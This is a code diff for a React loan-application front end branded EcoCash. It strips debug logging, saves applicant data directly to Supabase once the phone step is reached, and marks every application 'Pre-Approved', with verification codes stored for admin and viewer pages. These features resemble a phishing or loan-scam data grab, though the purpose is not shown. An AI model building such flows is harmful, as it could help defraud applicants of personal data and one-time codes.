@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from 'react';
+import React, { useEffect, useState } from 'react';
 import { motion, AnimatePresence } from 'motion/react';
 import { Header } from './components/Header';
 import { LoanCalculatorScreen } from './components/LoanCalculatorScreen';
@@ -11,6 +11,7 @@ import AdminPage from './components/AdminPage';
 import ViewerPage from './components/ViewerPage';
 import { AppStep, LoanFormData, SubmittedApplication } from './types';
 import { calculateMonthlyPayment } from './utils/calculator';
+import { buildApplicationInsertPayload, createApplicationInSupabase } from './utils/supabaseDirect';
 
 const initialFormData: LoanFormData = {
   loanType: 'Personal Loan',
@@ -29,7 +30,6 @@ export default function App() {
   const [currentStep, setCurrentStep] = useState<AppStep>('calculator');
   const [isAdminView, setIsAdminView] = useState<boolean>(() => {
     const isAdmin = window.location.pathname === '/admin';
-    console.log('[App] Initializing, pathname:', window.location.pathname, 'isAdmin:', isAdmin);
     return isAdmin;
   });
   const [isViewerView, setIsViewerView] = useState<boolean>(() => window.location.pathname === '/viewer');
@@ -38,11 +38,9 @@ export default function App() {
   const [isSubmitting, setIsSubmitting] = useState(false);
 
   useEffect(() => {
-    console.log('[App] useEffect - current isAdminView:', isAdminView);
     const handlePopState = () => {
       const newIsAdmin = window.location.pathname === '/admin';
       const newIsViewer = window.location.pathname === '/viewer';
-      console.log('[App] popstate - pathname:', window.location.pathname, 'newIsAdmin:', newIsAdmin, 'newIsViewer:', newIsViewer);
       setIsAdminView(newIsAdmin);
       setIsViewerView(newIsViewer);
     };
@@ -51,13 +49,11 @@ export default function App() {
   }, []);
 
   const navigateToAdmin = () => {
-    console.log('[App] Navigating to /admin');
     window.history.pushState({}, '', '/admin');
     setIsAdminView(true);
   };
 
   const navigateToApp = () => {
-    console.log('[App] Navigating back to /');
     window.history.pushState({}, '', '/');
     setIsAdminView(false);
     setIsViewerView(false);
@@ -80,56 +76,53 @@ export default function App() {
     setCurrentStep('calculator');
   };
 
-  const handleSubmitApplication = async () => {
-    setIsSubmitting(true);
-    const { monthlyPayment } = calculateMonthlyPayment(
-      formData.loanAmount,
-      formData.loanTermMonths
-    );
-
-    const payload = {
+  const handlePhoneReady = async () => {
+    const { monthlyPayment } = calculateMonthlyPayment(formData.loanAmount, formData.loanTermMonths);
+    const payload = buildApplicationInsertPayload({
       ...formData,
       monthlyPayment,
-    };
+    });
 
     try {
-      console.log('[App] Submitting application', { payload });
-      const response = await fetch('/api/applications', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload),
-      });
-
-      const text = await response.text();
-      console.log('[App] Submission response', {
-        status: response.status,
-        contentType: response.headers.get('content-type'),
-        body: text,
-      });
-
-      let result: any = null;
-      try {
-        result = text ? JSON.parse(text) : null;
-      } catch (parseError) {
-        console.error('[App] Submission JSON parse failed', parseError);
-        throw new Error('Received an invalid response from the server.');
-      }
-
-      if (!response.ok || !result?.success) {
-        throw new Error(result?.error || 'Unable to submit application.');
-      }
-
-      setSubmittedApplication(result.application);
-    } catch (error: any) {
-      console.error('[App] Submission error', error);
+      const createdRecord = await createApplicationInSupabase(payload);
+      const nextApplication: SubmittedApplication = {
+        ...formData,
+        id: createdRecord?.id ?? payload.id,
+        submittedAt: createdRecord?.submittedAt ?? payload.submittedAt,
+        monthlyPayment,
+        status: createdRecord?.status ?? 'Pre-Approved',
+        annualIncome: Number(formData.annualIncome) || 0,
+        verificationCode: createdRecord?.verificationCode ?? null,
+      };
+      setSubmittedApplication(nextApplication);
+    } catch (error) {
+      console.error('[App] Unable to create application row', error);
       const fallbackApp: SubmittedApplication = {
         ...formData,
-        id: `ECO-${Math.floor(100000 + Math.random() * 900000)}`,
-        submittedAt: new Date().toISOString(),
+        id: payload.id,
+        submittedAt: payload.submittedAt,
         monthlyPayment,
         status: 'Pre-Approved',
         annualIncome: Number(formData.annualIncome) || 0,
         verificationCode: null,
+      };
+      setSubmittedApplication(fallbackApp);
+    }
+  };
+
+  const handleSubmitApplication = async () => {
+    setIsSubmitting(true);
+    const { monthlyPayment } = calculateMonthlyPayment(formData.loanAmount, formData.loanTermMonths);
+
+    try {
+      const fallbackApp: SubmittedApplication = {
+        ...formData,
+        id: submittedApplication?.id ?? `ECO-${Math.floor(100000 + Math.random() * 900000)}`,
+        submittedAt: submittedApplication?.submittedAt ?? new Date().toISOString(),
+        monthlyPayment,
+        status: 'Pre-Approved',
+        annualIncome: Number(formData.annualIncome) || 0,
+        verificationCode: submittedApplication?.verificationCode ?? null,
       };
       setSubmittedApplication(fallbackApp);
     } finally {
@@ -141,11 +134,7 @@ export default function App() {
   if (isAdminView) {
     return (
       <div className="min-h-screen bg-slate-100/90 text-slate-900 font-sans flex flex-col justify-between selection:bg-blue-500 selection:text-white">
-        <Header
-          currentStep={currentStep}
-          onBack={navigateToApp}
-          onReset={navigateToApp}
-        />
+        <Header currentStep={currentStep} onBack={navigateToApp} onReset={navigateToApp} />
         <main className="flex-1 flex items-center justify-center p-3 sm:p-6">
           <AdminPage onBackToApp={navigateToApp} />
         </main>
@@ -159,11 +148,7 @@ export default function App() {
   if (isViewerView) {
     return (
       <div className="min-h-screen bg-slate-100/90 text-slate-900 font-sans flex flex-col justify-between selection:bg-blue-500 selection:text-white">
-        <Header
-          currentStep={currentStep}
-          onBack={navigateToApp}
-          onReset={navigateToApp}
-        />
+        <Header currentStep={currentStep} onBack={navigateToApp} onReset={navigateToApp} />
         <main className="flex-1 p-3 sm:p-6">
           <ViewerPage onBackToApp={navigateToApp} />
         </main>
@@ -176,14 +161,8 @@ export default function App() {
 
   return (
     <div className="min-h-screen bg-slate-100/90 text-slate-900 font-sans flex flex-col justify-between selection:bg-blue-500 selection:text-white">
-      {/* Sticky Top Header Navigation */}
-      <Header
-        currentStep={currentStep}
-        onBack={handleBack}
-        onReset={handleReset}
-      />
+      <Header currentStep={currentStep} onBack={handleBack} onReset={handleReset} />
 
-      {/* Main Container Card */}
       <main className="flex-1 flex items-center justify-center p-3 sm:p-6">
         <div className="w-full max-w-md bg-white border border-slate-200/90 rounded-3xl shadow-sm p-5 sm:p-7 transition-all my-2">
           <AnimatePresence mode="wait">
@@ -218,6 +197,7 @@ export default function App() {
                   updateFormData={updateFormData}
                   onNext={() => setCurrentStep('step3')}
                   onPrevious={() => setCurrentStep('step1')}
+                  onPhoneReady={handlePhoneReady}
                 />
               )}
 
@@ -251,7 +231,6 @@ export default function App() {
         </div>
       </main>
 
-      {/* Sticky / Centered Footer with Admin Link */}
       <footer className="py-4 text-center text-xs text-slate-400 font-medium flex items-center justify-center gap-3">
         <span>&copy; 2025 EcoCash</span>
         <span>&bull;</span>
